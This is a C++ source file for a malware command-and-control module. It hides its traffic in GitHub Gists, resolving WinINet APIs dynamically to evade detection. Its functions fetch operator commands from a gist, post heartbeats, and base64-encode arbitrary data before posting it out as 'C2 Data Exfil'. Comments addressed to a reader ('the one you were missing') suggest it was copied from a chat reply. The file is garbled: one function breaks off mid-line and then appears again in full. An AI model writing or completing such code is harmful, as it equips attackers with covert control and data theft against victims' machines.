// c2_communication.cpp

#include "c2_communication.h"
#include "api_resolution.h"
#include <stdio.h>

// Simple, self-contained Base64 encoder for exfiltration
void simpleBase64Encode(const char* input, char* output, int out_size) {
    const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int in_len = strlen(input);
    int i = 0, j = 0, x = 0;
    unsigned char char_array_3[3], char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++)
                output[x++] = base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; j < i + 1; j++)
            output[x++] = base64_chars[char_array_4[j]];

        while ((i++ < 3))
            output[x++] = '=';
    }
    output[x] = '\0';
}


// --- FUNCTION 1: FetchCommand() ---
// This function was likely already in your file, but here it is for completeness.
BOOL FetchCommand(C2Command* outCommand) {
    if (!outCommand) return FALSE;

    // Resolve all required WinINet functions dynamically
    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("wininet.dll", "HttpSendRequestA");
    pInternetReadFile InternetReadFile = (pInternetReadFile)resolve_api("wininet.dll", "InternetReadFile");
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)resolve_api("wininet.dll", "InternetCloseHandle");

    if (!InternetOpenA || !InternetConnectA || !HttpOpenRequestA || !HttpSendRequestA || !InternetReadFile || !InternetCloseHandle) {
        return FALSE;
    }

    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    // Open an internet connection
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;

    // Connect to the GitHub server
    hConnect = InternetConnectA(hInternet, "api.github.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;

    // Build the GET request
    char requestUrl[512];
    sprintf_s(requestUrl, sizeof(requestUrl), "/gists/%s", C2_GIST_ID);

    hRequest = HttpOpenRequestA(hConnect, "GET", requestUrl, "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) goto cleanup;

    // Add necessary headers for the API call
    const char* headers = "Accept: application/vnd.github.v3+json\r\n";
    
    // Send the request
    if (!HttpSendRequestA(hRequest, headers, -1L, NULL, 0)) goto cleanup;

    // Read the response
    char responseBuffer[4096];
    DWORD bytesRead;
    if (!InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead)) goto cleanup;
    responseBuffer[bytesRead] = '\0';

    // --- Parse the JSON response ---
    // This is a very simple and fragile parser. A real tool would use a proper JSON library.
    char* contentStart = strstr(responseBuffer, "\"" C2_COMMAND_FILENAME "\":");
    if (!contentStart) goto cleanup;
    
    char* valueStart = strstr(contentStart, "\"content\": \"");
    if (!valueStart) goto cleanup;
    valueStart += 12; // Move past "content": "

    char* valueEnd = strstr(valueStart, "\"");
    if (!valueEnd) goto cleanup;
    *valueEnd = '\0';

    // Parse the command and argument
    char* spacePos = strchr(valueStart, ' ');
    if (spacePos) {
        *spacePos = '\0';
        strncpy_s(outCommand->argument, sizeof(outCommand->argument), spacePos + 1, _TRUNCATE);
    } else {
        outCommand->argument[0] = '\0';
    }
    strncpy_s(outCommand->command, sizeof(outCommand->command), valueStart, _TRUNCATE);

    result = TRUE;

cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}


// --- FUNCTION 2: SendHeartbeat() (THIS IS THE ONE YOU WERE MISSING) ---
BOOL SendHeartbeat() {
    // Resolve all required WinINet functions dynamically
    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("wininet.dll", "HttpSendRequestA");
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)resolve_api("wininet.dll", "InternetCloseHandle");
    pGetTickCount GetTickCount = (pGetTickCount)resolve_api("kernel32.dll", "GetTickCount");

    if (!InternetOpenA || !InternetConnectA || !HttpOpenRequestA || !HttpSendRequestA || !InternetCloseHandle || !GetTickCount) {
        return FALSE;
    }

    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    // Open an internet connection
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;

    // Connect to the GitHub server
    hConnect = InternetConnectA(hInternet, "api.github.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;

    // Build the POST request
    char requestUrl[512];
    sprintf_s(requestUrl, sizeof(requestUrl), "/gists/%s", C2_G

    // --- FUNCTION 2: SendHeartbeat() (THIS IS THE ONE YOU WERE MISSING) ---
BOOL SendHeartbeat() {
    // Resolve all required WinINet functions dynamically
    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("wininet.dll", "HttpSendRequestA");
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)resolve_api("wininet.dll", "InternetCloseHandle");
    pGetTickCount GetTickCount = (pGetTickCount)resolve_api("kernel32.dll", "GetTickCount");

    if (!InternetOpenA || !InternetConnectA || !HttpOpenRequestA || !HttpSendRequestA || !InternetCloseHandle || !GetTickCount) {
        return FALSE;
    }

    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    // Open an internet connection
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;

    // Connect to the GitHub server
    hConnect = InternetConnectA(hInternet, "api.github.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;

    // Build the POST request
    char requestUrl[512];
    sprintf_s(requestUrl, sizeof(requestUrl), "/gists/%s", C2_GIST_ID);

    hRequest = HttpOpenRequestA(hConnect, "POST", requestUrl, "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) goto cleanup;

    // Create the JSON body for the POST request
    char heartbeatData[64];
    sprintf_s(heartbeatData, sizeof(heartbeatData), "%lu", GetTickCount());
    
    char jsonBody[1024];
    sprintf_s(jsonBody, sizeof(jsonBody),
        "{"
        "\"description\": \"C2 Heartbeat\","
        "\"files\": {"
        "\"%s\": {"
        "\"content\": \"%s\""
        "}"
        "}"
        "}",
        C2_HEARTBEAT_FILENAME, heartbeatData);

    // Add necessary headers for the API call
    const char* headers = "Content-Type: application/json\r\nAccept: application/vnd.github.v3+json\r\n";

    // Send the request
    if (!HttpSendRequestA(hRequest, headers, -1L, jsonBody, strlen(jsonBody))) goto cleanup;

    result = TRUE;

cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}


// --- FUNCTION 3: ExfiltrateData() ---
BOOL ExfiltrateData(const char* dataToExfil) {
    if (!dataToExfil) return FALSE;

    // Resolve all required WinINet functions dynamically
    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("wininet.dll", "HttpSendRequestA");
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)resolve_api("wininet.dll", "InternetCloseHandle");

    if (!InternetOpenA || !InternetConnectA || !HttpOpenRequestA || !HttpSendRequestA || !InternetCloseHandle) {
        return FALSE;
    }

    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    // Open an internet connection
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;

    // Connect to the GitHub server
    hConnect = InternetConnectA(hInternet, "api.github.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;

    // Build the POST request
    char requestUrl[512];
    sprintf_s(requestUrl, sizeof(requestUrl), "/gists/%s", C2_GIST_ID);

    hRequest = HttpOpenRequestA(hConnect, "POST", requestUrl, "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) goto cleanup;

    // Base64 encode the data to ensure it can be safely transmitted in JSON
    char encodedData[8192]; // Adjust size as needed
    simpleBase64Encode(dataToExfil, encodedData, sizeof(encodedData));

    // Create the JSON body for the POST request
    char jsonBody[16384]; // Adjust size as needed
    sprintf_s(jsonBody, sizeof(jsonBody),
        "{"
        "\"description\": \"C2 Data Exfil\","
        "\"files\": {"
        "\"%s\": {"
        "\"content\": \"%s\""
        "}"
        "}"
        "}",
        C2_EXFIL_FILENAME, encodedData);

    // Add necessary headers for the API call
    const char* headers = "Content-Type: application/json\r\nAccept: application/vnd.github.v3+json\r\n";

    // Send the request
    if (!HttpSendRequestA(hRequest, headers, -1L, jsonBody, strlen(jsonBody))) goto cleanup;

    result = TRUE;

cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}    
